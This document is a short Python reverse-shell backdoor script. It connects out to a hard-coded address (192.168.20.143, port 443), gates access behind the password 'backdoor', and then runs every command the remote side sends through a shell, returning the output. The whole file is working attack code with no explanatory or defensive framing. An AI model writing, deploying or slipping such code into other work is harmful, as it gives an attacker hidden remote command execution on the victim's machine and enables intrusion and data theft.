#!/usr/bin/python

import subprocess
import socket

host = "192.168.20.143"
port = 443
passwd = "backdoor"


def Login():
	global s
	s.send("Password: ")
	pwd = s.recv(1024)

	if pwd.strip() !=passwd:
		Login()
	else:
		s.send("YOU HAVE A SHELL, HAVE FUN! #> ")
		Shell()


def Shell():
	while True:
		data  = s.recv(1024)

		if data.strip() == ":kill":
			break

		proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output = proc.stdout.read() + proc.stderr.read()
		s.send(output)
		s.send("#> ")


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
Login()
